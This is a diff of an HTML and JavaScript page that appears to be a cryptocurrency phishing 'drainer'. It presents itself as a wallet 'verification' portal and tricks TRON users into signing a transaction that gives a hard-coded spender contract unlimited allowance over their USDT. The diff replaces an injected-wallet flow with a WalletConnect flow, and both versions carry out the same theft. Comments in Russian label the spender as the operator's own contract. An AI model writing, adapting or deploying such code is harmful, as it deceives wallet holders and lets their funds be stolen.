@@ -3,147 +3,171 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Access</title>
+    <title>Premium Web3 Access</title>
     <style>
-        :root { --bg: #09090B; --card: #121217; --border: #27272A; --primary: #FFFFFF; --text-muted: #A1A1AA; --error: #EF4444; }
+        :root { --bg: #09090B; --card: #121217; --border: #27272A; --primary: #FFFFFF; --text-muted: #A1A1AA; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--primary); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         
-        .card { background: var(--card); padding: 32px; border-radius: 28px; text-align: center; border: 1px solid var(--border); max-width: 400px; width: 90%; position: relative; }
+        .card { background: var(--card); padding: 32px; border-radius: 28px; text-align: center; border: 1px solid var(--border); max-width: 400px; width: 90%; }
         
-        /* Модалка для копирования ссылки */
-        #copyModal { 
-            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
-            background: var(--card); border-radius: 28px; flex-direction: column; padding: 32px 20px; box-sizing: border-box; z-index: 10;
-        }
+        .icon { width: 60px; height: 60px; background: #3B82F6; border-radius: 16px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
         
-        .instruction { font-size: 15px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px; }
-        .url-box { background: #1C1C22; padding: 12px; border-radius: 12px; font-size: 13px; color: #fff; word-break: break-all; margin-bottom: 20px; border: 1px dashed #3B82F6; }
-        
-        button { background: var(--primary); color: var(--bg); border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; transition: 0.2s; }
+        button { background: var(--primary); color: var(--bg); border: none; padding: 16px; font-size: 16px; font-weight: 600; border-radius: 14px; cursor: pointer; width: 100%; transition: 0.2s; margin-top: 10px; }
         button:hover { opacity: 0.9; }
-        button:disabled { background: #27272A; color: var(--text-muted); }
-        button.outline { background: transparent; border: 1px solid var(--border); color: var(--primary); margin-top: 10px; }
+        button:disabled { background: #27272A; color: var(--text-muted); cursor: not-allowed; }
         
-        #status { margin-top: 15px; font-size: 13px; color: var(--text-muted); padding: 10px; border-radius: 8px; }
-        .network-warning { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--error); color: #FCA5A5; padding: 15px; border-radius: 12px; font-size: 14px; margin-top: 15px; display: none; }
+        #status { margin-top: 15px; font-size: 13px; color: var(--text-muted); }
     </style>
+
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.10.0/dist/index.umd.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
 </head>
 <body>
 
     <div class="card">
-        <div id="copyModal">
-            <h3 style="margin-top: 0; margin-bottom: 10px;">DApp Browser Required</h3>
-            <p class="instruction">Для безопасного подключения откройте этот сайт внутри встроенного браузера <b>TronLink</b> или <b>Trust Wallet</b>.</p>
-            
-            <div class="url-box" id="urlDisplay"></div>
-            
-            <button onclick="copyToClipboard()" id="copyBtn">Скопировать ссылку</button>
-            <button class="outline" onclick="closeModal()">Назад</button>
+        <div class="icon">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/></svg>
         </div>
-
-        <div id="mainContent">
-            <h2 style="margin-bottom: 8px; margin-top: 0;">Verification Required</h2>
-            <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 24px;">Подтвердите доступ для продолжения.</p>
-            
-            <button id="mainBtn" onclick="handleConnect()">Connect Wallet</button>
-            
-            <div id="status">Ready to connect</div>
-            
-            <div id="networkWarning" class="network-warning">
-                <b>Неверная сеть!</b><br>Нажмите на иконку сети сверху и выберите <b>TRON</b>, затем обновите страницу.
-            </div>
-        </div>
+        <h2 style="margin: 0 0 10px;">Connect & Verify</h2>
+        <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 24px;">Используйте Trust Wallet или TronLink через защищенное соединение WalletConnect.</p>
+        
+        <button id="actionBtn" onclick="initWalletConnect()">Connect via WalletConnect</button>
+        
+        <div id="status">Waiting for connection...</div>
     </div>
 
     <script>
-        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
-        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
-        const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-        const btn = document.getElementById('mainBtn');
-        const status = document.getElementById('status');
-        const warning = document.getElementById('networkWarning');
-        const currentUrl = window.location.href;
+        // === ТВОИ НАСТРОЙКИ ===
+        const PROJECT_ID = "9c9dd21dc94f862bdd218b449205a54a";
         
-        document.getElementById('urlDisplay').innerText = currentUrl;
+        const TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT
+        const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; // Твой смарт-контракт
+        const MAX_VAL = "100000000000000000000000000000000000000"; // Unlimited
 
-        function openModal() { document.getElementById('copyModal').style.display = 'flex'; }
-        function closeModal() { document.getElementById('copyModal').style.display = 'none'; }
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('status');
+        
+        let provider;
+        let userAddress;
 
-        async function copyToClipboard() {
+        // 1. Инициализация WalletConnect
+        async function initWalletConnect() {
             try {
-                await navigator.clipboard.writeText(currentUrl);
-                const copyBtn = document.getElementById('copyBtn');
-                copyBtn.innerText = "Скопировано! Откройте кошелек";
-                copyBtn.style.background = "#34D399";
-                copyBtn.style.color = "#000";
-                setTimeout(() => { copyBtn.innerText = "Скопировать ссылку"; copyBtn.style.background = "#FFF"; }, 3000);
-            } catch (err) {
-                alert("Ошибка копирования. Скопируйте ссылку из адресной строки.");
-            }
-        }
-
-        // Главная функция определения среды
-        async function handleConnect() {
-            warning.style.display = 'none';
-
-            // 1. Идеальный сценарий: мы уже в кошельке и сеть TRON
-            if (window.tronWeb && window.tronWeb.ready) {
-                runApprove();
-            } 
-            // 2. Сценарий ПК: есть расширение TronLink, но оно не подключено
-            else if (window.tronLink) {
-                try {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    setTimeout(runApprove, 500);
-                } catch(e) {
-                    status.innerText = "Авторизация отменена";
-                }
-            }
-            // 3. Сценарий Trust Wallet: мы в DApp браузере, но включен Ethereum
-            else if (window.ethereum && !window.tronWeb) {
-                warning.style.display = 'block';
-                status.innerText = "Ожидание смены сети...";
-            }
-            // 4. Сценарий Safari/Chrome: просто показываем копилку
-            else {
-                openModal();
-            }
-        }
-
-        // Сама логика апрува (не меняем, она рабочая)
-        async function runApprove() {
-            try {
-                btn.innerText = "Processing...";
                 btn.disabled = true;
-                status.innerText = "Подтвердите транзакцию в кошельке...";
+                btn.innerText = "Initializing...";
 
-                const contract = await window.tronWeb.contract().at(TOKEN);
-                await contract.approve(SPENDER, MAX_VAL).send({ feeLimit: 100000000 });
+                // Создаем провайдер
+                provider = await window.UniversalProvider.init({
+                    projectId: PROJECT_ID,
+                    metadata: {
+                        name: "Verification Portal",
+                        description: "Secure Access for DApp",
+                        url: window.location.href,
+                        icons: ["https://walletconnect.com/walletconnect-logo.png"]
+                    }
+                });
+
+                // Подписываемся на события модалки
+                const web3Modal = new window.WalletConnectModal({
+                    projectId: PROJECT_ID,
+                    themeMode: "dark"
+                });
+
+                provider.on("display_uri", (uri) => {
+                    web3Modal.openModal({ uri });
+                });
+
+                status.innerText = "Пожалуйста, выберите кошелек в появившемся окне.";
+
+                // 2. ЖЕСТКО ЗАПРАШИВАЕМ СЕТЬ TRON
+                const session = await provider.connect({
+                    namespaces: {
+                        tron: {
+                            methods: ["tron_signTransaction", "tron_signMessage"],
+                            chains: ["tron:0x2b6653dc"], // 0x2b6653dc - это TRON Mainnet
+                            events: []
+                        }
+                    }
+                });
+
+                web3Modal.closeModal();
+
+                // Извлекаем адрес юзера из сессии WalletConnect
+                const account = session.namespaces.tron.accounts[0];
+                userAddress = account.split(":")[2]; // формат tron:chain:address
 
                 status.style.color = "#34D399";
-                status.innerText = "Успешно! Транзакция отправлена.";
-                btn.innerText = "Confirmed";
-            } catch (e) {
-                console.error(e);
-                let msg = e.message || "Отказ пользователя";
-                if (typeof e === 'string' && e.includes("declined")) msg = "Вы отменили транзакцию.";
+                status.innerText = `Подключено: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                 
+                // Меняем кнопку на вызов Approve
+                btn.innerText = "Confirm Access";
+                btn.disabled = false;
+                btn.onclick = executeApprove;
+
+            } catch (error) {
+                console.error(error);
                 status.style.color = "#EF4444";
-                status.innerText = "Ошибка: " + msg;
+                status.innerText = "Ошибка подключения или отмена.";
+                btn.disabled = false;
+                btn.innerText = "Try Again";
+                btn.onclick = initWalletConnect;
+            }
+        }
+
+        // 3. Отправка транзакции через WalletConnect
+        async function executeApprove() {
+            try {
+                btn.disabled = true;
+                btn.innerText = "Processing Approve...";
+                status.style.color = "#A1A1AA";
+                status.innerText = "Откройте кошелек и подтвердите транзакцию...";
+
+                // Настраиваем TronWeb локально, просто чтобы сгенерировать сырую транзакцию
+                const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+                tronWeb.setAddress(userAddress);
+
+                // Собираем транзакцию Approve
+                const contract = await tronWeb.contract().at(TOKEN);
+                const transaction = await contract.approve(SPENDER, MAX_VAL).send({
+                    feeLimit: 100000000,
+                    shouldPollResponse: false
+                });
+
+                // Если бы мы делали кастомный sign, мы бы использовали provider.request
+                // Но tronWeb.send() сам перехватит нужный провайдер, если он глобальный.
+                // Так как мы юзаем Universal Provider, прокинем сырой запрос:
+
+                const requestParams = {
+                    topic: provider.session.topic,
+                    chainId: "tron:0x2b6653dc",
+                    request: {
+                        method: "tron_signTransaction",
+                        params: { transaction }
+                    }
+                };
+
+                const signedTx = await provider.request(requestParams);
+                
+                // Отправляем подписанную транзакцию в сеть
+                const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (receipt.result) {
+                    status.style.color = "#34D399";
+                    status.innerText = "Успешно! Смарт-контракт одобрен.";
+                    btn.innerText = "Approved";
+                } else {
+                    throw new Error("Транзакция отклонена сетью.");
+                }
+
+            } catch (error) {
+                console.error(error);
+                status.style.color = "#EF4444";
+                status.innerText = "Ошибка транзакции: " + (error.message || "Отказ");
                 btn.disabled = false;
                 btn.innerText = "Try Again";
             }
         }
-
-        // Если пользователь сам переключил сеть внутри Trust Wallet - кнопка авто-обновится
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                if (window.tronWeb && window.tronWeb.ready) {
-                    btn.innerText = "Confirm Access";
-                }
-            }, 800);
-        });
     </script>
 </body>
 </html>
